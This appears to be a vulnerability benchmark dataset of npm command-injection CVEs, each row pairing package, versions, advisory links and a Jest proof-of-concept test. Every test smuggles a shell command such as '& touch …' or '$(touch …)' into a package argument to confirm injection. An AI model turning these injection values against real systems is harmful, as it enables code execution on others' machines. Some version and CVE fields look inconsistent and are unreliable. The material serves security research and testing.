",,index.js:21:8,https://security.snyk.io/vuln/SNYK-JS-GITADDREMOTE-564269; 
command-injection,CVE-2020-7631,diskusage-ng,0.2.6,1.0.0,command-injection/diskusage-ng_0.2.6,"test(""Command Injection in diskusage-ng"", (done) => {
  expect.assertions(2);
  const root = require(""diskusage-ng"");
  const fs = require(""fs"");
  const path = ""./diskusage-ng"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root(['""&touch diskusage-ng""'], () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlinkSync(path);
    done();
  });
});
",https://github.com/iximiuz/node-diskusage-ng/commit/48e7e093486b528f0c81ec699573e0e4a431b8d3#diff-38182cfe286a150ebcc88df0ec57ed66,lib/posix.js:11:5,https://security.snyk.io/vuln/SNYK-JS-DISKUSAGENG-564425; https://github.com/advisories/GHSA-3269-x4pw-vffg
command-injection,CVE-2020-7781,connection-tester,0.2.0,0.2.1,command-injection/connection-tester_0.2.0,"test(""Command Injection in connection-tester"", () => {
  expect.assertions(2);
  const a = require(""connection-tester"");
  const fs = require(""fs"");
  const path = ""./connection-tester"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.test(""& touch connection-tester"", 123, 1000);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlinkSync(path);
  fs.unlinkSync(""1000"");
  fs.unlinkSync(""123"");
});
",,index.js:15:28,https://security.snyk.io/vuln/SNYK-JS-CONNECTIONTESTER-1048337; https://github.com/advisories/GHSA-w5mp-8p8w-mhh8
command-injection,CVE-2020-6836,hot-formula-parser,3.0.0,3.0.1,command-injection/hot-formula-parser_3.0.0,"test(""Command Injection in hot-formula-parser"", () => {
  expect.assertions(2);
  const FormulaParser = require(""hot-formula-parser"").Parser;
  const fs = require(""fs"");
  const path = ""./hot-formula-parser"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let parser = new FormulaParser();
  parser.parse(
    ""SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])""
  );
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/handsontable/formula-parser/commit/396b089738d4bf30eb570a4fe6a188affa95cd5e,lib/grammar-parser/grammar-parser.js:258:31,https://security.snyk.io/vuln/SNYK-JS-HOTFORMULAPARSER-541328; https://github.com/advisories/GHSA-rc77-xxq6-4mff
command-injection,CVE-2021-23380,roar-pidusage,1.1.6,,command-injection/roar-pidusage_1.1.6,"test(""Command Injection in roar-pidusage"", (done) => {
  expect.assertions(1);
  const os = require(""os"");
  os.platform = () => {
    return ""freebsd"";
  };
  const roar_pidusage = require(""roar-pidusage"");
  const fs = require(""fs"");
  const path = ""./roar-pidusage"";
  roar_pidusage.stat(""$(touch roar-pidusage)"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/stats.js:103:5,https://security.snyk.io/vuln/SNYK-JS-ROARPIDUSAGE-1078528; https://github.com/advisories/GHSA-xfxf-qw26-hr33
command-injection,CVE-2018-16461,libnmap,0.4.11,0.4.16,command-injection/libnmap_0.4.11,"test(""Command Injection in libnmap"", (done) => {
  expect.assertions(2);
  const nmap = require(""libnmap"");
  const fs = require(""fs"");
  const path = ""./libnmap"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  const opts = {
    range: [""scanme.nmap.org"", ""x.x.$(touch libnmap)""],
  };
  nmap.scan(opts, function (err, report) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/jas-/node-libnmap/commit/c235b24b0342e12a5dbf502f89daabe95883b6c8,lib/classes/tools.js:114:25,https://security.snyk.io/vuln/SNYK-JS-LIBNMAP-72551; https://github.com/advisories/GHSA-7g2w-6r25-2j7p
command-injection,CVE-2020-7636,git-tags-remote,1.0.2,,command-injection/git-tags-remote_1.0.2,"test(""Command Injection in git-tags-remote"", () => {
  expect.assertions(2);
  const gitTagsRemote = require(""git-tags-remote"");
  const fs = require(""fs"");
  const path = ""./git-tags-remote"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return gitTagsRemote
    .get(
      ""https://github.com/sh0ji/git-tags-remote.git; touch git-tags-remote > /tmp/command-injection.test""
    )
    .finally((tags) => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",,index.js:5:2,https://security.snyk.io/vuln/SNYK-JS-GITTAGSREMOTE-596503; https://github.com/advisories/GHSA-4m6q-rxhm-675w
command-injection,,open,0.0.5,6.0.0,command-injection/open_0.0.5,"test(""Command Injection in open"", (done) => {
  expect.assertions(2);
  const fs = require(""fs"");
  const path = ""./open"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  require(""open"")('""""`touch open`');
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
",,lib/open.js:58:10,https://security.snyk.io/vuln/npm:open:20180512; https://github.com/advisories/GHSA-28xh-wpgr-7fm8
command-injection,CVE-2021-23381,killing,1.0.6,,command-injection/killing_1.0.6,"test(""Command Injection in killing"", (done) => {
  const killing = require(""killing"");
  const fs = require(""fs"");
  const path = ""./killing"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  killing(""$(touch killing & exit 1)"");
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
",,lib/killing.js:35:7,https://security.snyk.io/vuln/SNYK-JS-KILLING-1078532; https://github.com/advisories/GHSA-cq77-8jpx-892g
command-injection,CVE-2018-16462,apex-publish-static-files,2.0.0,2.0.1,command-injection/apex-publish-static-files_2.0.0,"test(""Command Injection in apex-publish-static-files"", () => {
  expect.assertions(2);
  const publisher = require(""apex-publish-static-files"");
  const fs = require(""fs"");
  const path = ""./apex-publish-static-files"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    publisher.publish({
      connectString: "";touch apex-publish-static-files;"",
      directory: ""./"",
      appID: 111,
    });
  } catch (err) {
  } finally {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  }
});
",https://github.com/vincentmorneau/apex-publish-static-files/commit/2209af8f2b65c24aa55ab757e0e05b958c16f063,index.js:54:25,https://security.snyk.io/vuln/SNYK-JS-APEXPUBLISHSTATICFILES-72552; https://github.com/advisories/GHSA-9jm3-5835-537m
command-injection,CVE-2019-10776,command-exists,1.2.2,0.22.2,command-injection/command-exists_1.2.2,"test(""Command Injection in command-exists"", () => {
  expect.assertions(2);
  const commandExists = require(""command-exists"");
  const fs = require(""fs"");
  const path = ""./command-exists"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  commandExists.sync("";touch command-exists"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/kellyselden/git-diff-apply/commit/106d61d3ae723b4257c2a13e67b95eb40a27e0b5,lib/command-exists.js:78:22,https://security.snyk.io/vuln/npm:command-exists:20180512; https://github.com/advisories/GHSA-84cm-v6jp-gjmr
command-injection,CVE-2019-10776,scp,0.0.3,0.22.2,command-injection/scp_0.0.3,"test(""Command Injection in scp"", (done) => {
  expect.assertions(2);
  const scp = require(""scp"");
  const fs = require(""fs"");
  const path = ""./scp"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = {
    file: ""& touch scp; #"",
    user: ""username"",
    host: ""myServer"",
    port: ""20"",
    path: ""~"",
  };
  scp.send(options, function (err) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/kellyselden/git-diff-apply/commit/106d61d3ae723b4257c2a13e67b95eb40a27e0b5,scp.js:21:3,https://security.snyk.io/vuln/SNYK-JS-SCP-1009828; https://github.com/advisories/GHSA-84cm-v6jp-gjmr
command-injection,CVE-2020-28440,corenlp-js-interface,1.0.3,,command-injection/corenlp-js-interface_1.0.3,"test(""Command Injection in corenlp-js-interface"", () => {
  expect.assertions(2);
  const a = require(""corenlp-js-interface"");
  const fs = require(""fs"");
  const path = ""./corenlp-js-interface"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""') touch corenlp-js-interface # '"", """", """", """");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,index.js:5:20,https://security.snyk.io/vuln/SNYK-JS-CORENLPJSINTERFACE-1050435; https://github.com/advisories/GHSA-ffxg-xm4w-3wg9
command-injection,CVE-2017-16034,pidusage,1.0.0,1.1.5,command-injection/pidusage_1.0.0,"test(""Command Injection in pidusage"", (done) => {
  expect.assertions(1);
  const os = require(""os"");
  os.platform = () => {
    return ""freebsd"";
  };
  const roar_pidusage = require(""pidusage"");
  const fs = require(""fs"");
  const path = ""./pidusage"";
  roar_pidusage.stat(""$(touch pidusage)"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/soyuka/pidusage/commit/b70eca15f7ca7f1b82a15f8a5d4bb48737f5a89d,lib/stats.js:108:5,https://security.snyk.io/vuln/npm:pidusage:20170605; https://github.com//advisories/GHSA-hfq9-rfpv-j8r8
command-injection,CVE-2020-28447,xopen,1.0.0,,command-injection/xopen_1.0.0,"test(""Command Injection in xopen"", () => {
  expect.assertions(2);
  const root = require(""xopen"");
  const fs = require(""fs"");
  const path = ""./xopen"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = ""& touch xopen"";
  return root(attack_code).finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",,index.js:13:5,https://security.snyk.io/vuln/SNYK-JS-XOPEN-1050981; 
command-injection,CVE-2020-28435,ffmpeg-sdk,0.0.5,,command-injection/ffmpeg-sdk_0.0.5,"test(""Command Injection in ffmpeg-sdk"", () => {
  expect.assertions(2);
  const root = require(""ffmpeg-sdk"");
  const fs = require(""fs"");
  const path = ""./ffmpeg-sdk"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return root
    .execute(""touch ffmpeg-sdk"")
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",,index.js:9:5,https://security.snyk.io/vuln/SNYK-JS-FFMPEGSDK-1050429; 
command-injection,CVE-2020-7636,adb-driver,0.1.8,,command-injection/adb-driver_0.1.8,"test(""Command Injection in adb-driver"", () => {
  expect.assertions(2);
  const root = require(""adb-driver"");
  const fs = require(""fs"");
  const path = ""./adb-driver"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return root.execADBCommand("" & touch adb-driver"").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",,build/AdbDriver.js:26:25,https://security.snyk.io/vuln/SNYK-JS-ADBDRIVER-564430; https://github.com/advisories/GHSA-4m6q-rxhm-675w
command-injection,CVE-2021-23363,kill-by-port,0.0.1,0.0.2,command-injection/kill-by-port_0.0.1,"test(""Command Injection in kill-by-port"", () => {
  expect.assertions(2);
  const kill_by_port = require(""kill-by-port"");
  const fs = require(""fs"");
  const path = ""./kill-by-port"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  kill_by_port.killByPort(""$(touch kill-by-port)"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, () => {});
});
",https://github.com/GuyMograbi/kill-by-port/commit/ea5b1f377e196a4492e05ff070eba8b30b7372c4,index.js:8:17,https://security.snyk.io/vuln/SNYK-JS-KILLBYPORT-1078531; https://github.com/advisories/GHSA-mm4f-47ch-f7hx
command-injection,CVE-2020-15123,codecov,3.6.4,3.7.1,command-injection/codecov_3.6.4,"process.on(""unhandledRejection"", () => {});
test(""Command Injection in codecov"", async () => {
  expect.assertions(2);
  const root = require(""codecov"");
  const fs = require(""fs"");
  const path = ""./codecov"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let args = {
    options: {
      ""gcov-root"": ""& touch codecov &"",
      ""gcov-exec"": "" "",
      ""gcov-args"": "" "",
    },
  };
  try {
    await root.handleInput.upload(
      args,
      function () {
        console.log(""success"");
      },
      function () {
        console.log(""Fail!"");
      }
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/codecov/codecov-node/commit/c0711c656686e902af2cd92d6aecc8074de4d83d,lib/codecov.js:419:7,https://security.snyk.io/vuln/SNYK-JS-CODECOV-585979; https://github.com/advisories/GHSA-xp63-6vf5-xf3v
command-injection,CVE-2020-7794,buns,1.1.6,,command-injection/buns_1.1.6,"test(""Command Injection in buns"", () => {
  expect.assertions(2);
  var root = require(""buns"");
  const fs = require(""fs"");
  const path = ""./buns"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var name = ""& touch buns"";
  try {
    root.install(name);
  } catch (error) {
  } finally {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  }
});
",,lib/index.js:678:9,https://security.snyk.io/vuln/SNYK-JS-BUNS-1050389; https://github.com/advisories/GHSA-487w-pqcm-63hq
command-injection,CVE-2021-23359,port-killer,1.0.1,,command-injection/port-killer_1.0.1,"test(""Command Injection in port-killer"", () => {
  expect.assertions(2);
  const port_killer = require(""port-killer"");
  const fs = require(""fs"");
  const path = ""./port-killer"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  port_killer(""$(touch port-killer)"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,index.js:19:9,https://security.snyk.io/vuln/SNYK-JS-PORTKILLER-1078533; https://github.com/advisories/GHSA-2548-q746-x5x6
command-injection,CVE-2020-28431,wc-cmd,1.0.9,,command-injection/wc-cmd_1.0.9,"test(""Command Injection in wc-cmd"", (done) => {
  expect.assertions(2);
  const a = require(""wc-cmd"");
  const fs = require(""fs"");
  const path = ""./wc-cmd"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""touch wc-cmd"", () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,index.js:49:19,https://security.snyk.io/vuln/SNYK-JS-WCCMD-1050423; https://github.com/advisories/GHSA-mx3r-w3pj-7wv7
command-injection,CVE-2015-7982,gm,1.20.0,=1.20.0,command-injection/gm_1.20.0,"const { doesNotMatch } = require(""assert"");
test(""Command Injection in gm"", (done) => {
  expect.assertions(2);
  const gm = require(""gm"");
  const fs = require(""fs"");
  const path = ""./gm"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  gm.compare(""$(touch gm)"", ""/path/to/another.png"", function (
    err,
    isEqual,
    equality,
    raw,
    path1,
    path2
  ) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/compare.js:72:5,https://security.snyk.io/vuln/npm:gm:20151026; https://github.com/advisories/GHSA-pjh3-jv7w-9jpr
command-injection,CVE-2021-23355,ps-kill,1.0.0,,command-injection/ps-kill_1.0.0,"test(""Command Injection in ps-kill"", (done) => {
  expect.assertions(3);
  expect.assertions(2);
  const ps_kill = require(""ps-kill"");
  const fs = require(""fs"");
  const path = ""./ps-kill"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps_kill.kill(""$(touch ps-kill)"", function (error) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,index.js:8:3,https://security.snyk.io/vuln/SNYK-JS-PSKILL-1078529; https://github.com/advisories/GHSA-7qmm-q394-fmch
command-injection,CVE-2020-26707,aaptjs,1.3.1,,command-injection/aaptjs_1.3.1,"test(""Remote code execution in aaptjs"", (done) => {
  const aaptjs = require(""aaptjs"");
  const fs = require(""fs"");
  const path = ""./aaptjs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    aaptjs.list(""; touch aaptjs"", (err, data) => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    });
  } catch (error) {}
});
",,index.js:18:3,https://security.snyk.io/vuln/SNYK-JS-AAPTJS-1769273; https://github.com/advisories/GHSA-m7p2-ghfh-pjvx
command-injection,CVE-2020-28439,corenlp-js-prefab,1.0.1,,command-injection/corenlp-js-prefab_1.0.1,"test(""Command Injection in corenlp-js-prefab"", (done) => {
  expect.assertions(2);
  const a = require(""corenlp-js-prefab"");
  const fs = require(""fs"");
  const path = ""./corenlp-js-prefab"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.process(""') touch corenlp-js-prefab # '"");
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {
    done();
  });
});
",,index.js:10:16,https://security.snyk.io/vuln/SNYK-JS-CORENLPJSPREFAB-1050434; https://github.com/advisories/GHSA-h73g-8g27-xxcx
command-injection,CVE-2020-28436,google-cloudstorage-commands,0.0.1,,command-injection/google-cloudstorage-commands_0.0.1,"test(""Command Injection in google-cloudstorage-commands"", () => {
  expect.assertions(2);
  var root = require(""google-cloudstorage-commands"");
  const fs = require(""fs"");
  const path = ""./google-cloudstorage-commands"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return root
    .upload(""./"", ""& touch google-cloudstorage-commands"", true)
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",,index.js:11:24,https://security.snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431; 
command-injection,CVE-2019-10783,lsof,0.1.0,,command-injection/lsof_0.1.0,"const { doesNotMatch } = require(""assert"");
test(""Command Injection in lsof"", (done) => {
  expect.assertions(2);
  const root = require(""lsof"");
  const fs = require(""fs"");
  const path = ""./lsof"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = ""& touch lsof &"";
  root.rawTcpPort(attack_code, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/lsof.js:37:8,https://security.snyk.io/vuln/SNYK-JS-LSOF-543632; https://github.com/advisories/GHSA-whq6-mj2r-mjqc
command-injection,CVE-2018-13797,macaddress,0.2.8,0.2.9,command-injection/macaddress_0.2.8,"test(""Command Injection in macaddress"", (done) => {
  expect.assertions(2);
  const fs = require(""fs"");
  const path = ""./macaddress"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let iface = ""; touch macaddress; echo "";
  require(""macaddress"").one(iface, function (err, mac) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/scravy/node-macaddress/commit/358fd594adb196a86b94ac9c691f69fe5dad2332,lib/unix.js:4:5,https://security.snyk.io/vuln/npm:macaddress:20180511; https://github.com/advisories/GHSA-pp57-mqmh-44h7
command-injection,CVE-2020-7624,effect,1.0.4,,command-injection/effect_1.0.4,"test(""Command Injection in effect"", (done) => {
  expect.assertions(2);
  const Root = require(""effect"");
  const fs = require(""fs"");
  const path = ""./effect"";
  var options = { image: ""& touch effect"" };
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  Root.edge(options, () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    try {
      fs.unlinkSync(""-colorspace"");
      fs.unlinkSync(""-edge"");
      fs.unlinkSync(""-negate"");
      fs.unlinkSync(""-resize"");
      fs.unlinkSync(""5"");
      fs.unlinkSync(""100%"");
      fs.unlinkSync(""Gray"");
      fs.unlinkSync(path);
    } catch (err) {}
    done();
  });
});
",,helper.js:24:5,https://security.snyk.io/vuln/SNYK-JS-EFFECT-564256; 
command-injection,CVE-2019-15597,node-df,0.1.4,,command-injection/node-df_0.1.4,"test(""Command Injection in node-df"", (done) => {
  expect.assertions(2);
  const df = require(""node-df"");
  const fs = require(""fs"");
  const path = ""./node-df"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = {
    file: ""/;touch node-df"",
    prefixMultiplier: ""GB"",
    isDisplayPrefixMultiplier: true,
    precision: 2,
  };
  df(options, function (error, response) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/index.js:41:5,https://security.snyk.io/vuln/SNYK-JS-NODEDF-536779; https://github.com/advisories/GHSA-wp7m-mrvf-599c
command-injection,,extra-asciinema,1.0.0,1.0.23,command-injection/extra-asciinema_1.0.0,"test(""Command Injection in extra-asciinema"", (done) => {
  expect.assertions(2);
  const asciinema = require(""extra-asciinema"");
  const fs = require(""fs"");
  const path = ""./extra-asciinema"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  asciinema.uploadSync(""; touch extra-asciinema"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {
    done();
  });
});
",https://github.com/nodef/extra-asciinema/commit/fd1a8a38d6c72e1eb573b2ab03d5e86de8047480,index.js:208:20,https://security.snyk.io/vuln/SNYK-JS-EXTRAASCIINEMA-608292; 
command-injection,CVE-2020-8178,install-package,0.4.17,,command-injection/jison_0.4.17,"test(""Command Injection in jison"", (done) => {
  expect.assertions(2);
  exec = require(""child_process"").exec;
  const fs = require(""fs"");
  const path = ""./jison"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let command = ""; touch jison"";
  exec(""jison "" + command, function (error) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,build/queueRunner.js:45:12,https://security.snyk.io/vuln/SNYK-JS-JISON-570539; https://github.com/advisories/GHSA-vr9x-mm65-2438
command-injection,CVE-2021-23377,lycwed-spritesheetjs,1.2.5,,command-injection/lycwed-spritesheetjs_1.2.5,"test(""Command Injection in lycwed-spritesheetjs"", (done) => {
  expect.assertions(2);
  let spritesheet = require(""lycwed-spritesheetjs"");
  const fs = require(""fs"");
  const path = ""./lycwed-spritesheetjs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  spritesheet(
    ""./"",
    {
      fuzz: ""& touch lycwed-spritesheetjs #"",
      ext: ""json"",
    },
    function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    }
  );
});
",,lib/generator.js:85:7,https://security.snyk.io/vuln/SNYK-JS-LYCWEDSPRITESHEETJS-1050428; https://github.com/advisories/GHSA-rhwp-9vm9-547q
command-injection,CVE-2018-16460,ps,0.0.2,1.0.0,command-injection/ps_0.0.2,"test(""Command Injection in ps"", (done) => {
  expect.assertions(2);
  const ps = require(""ps"");
  const fs = require(""fs"");
  const path = ""./ps"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps.lookup({ pid: ""$(touch ps)"" }, function (err, proc) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/index.js:8:5,https://security.snyk.io/vuln/SNYK-JS-PS-72307; https://github.com/advisories/GHSA-cfhg-9x44-78h2
command-injection,CVE-2020-7795,get-npm-package-version,1.0.6,1.0.7,command-injection/get-npm-package-version_1.0.6,"test(""Command Injection in get-npm-package-version"", () => {
  expect.assertions(2);
  const a = require(""get-npm-package-version"");
  const fs = require(""fs"");
  const path = ""./get-npm-package-version"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""& touch get-npm-package-version"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/hoperyy/get-npm-package-version/commit/40b1cf31a0607ea66f9e30a0c3af1383b52b2dec,index.js:16:48,https://security.snyk.io/vuln/SNYK-JS-GETNPMPACKAGEVERSION-1050390; 
command-injection,CVE-2019-15597,xps,1.0.2,,command-injection/xps_1.0.2,"test(""Command Injection in xps"", (done) => {
  expect.assertions(2);
  const ps = require(""xps"");
  const fs = require(""fs"");
  const path = ""./xps"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps.kill(""`touch xps;`"").fork(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
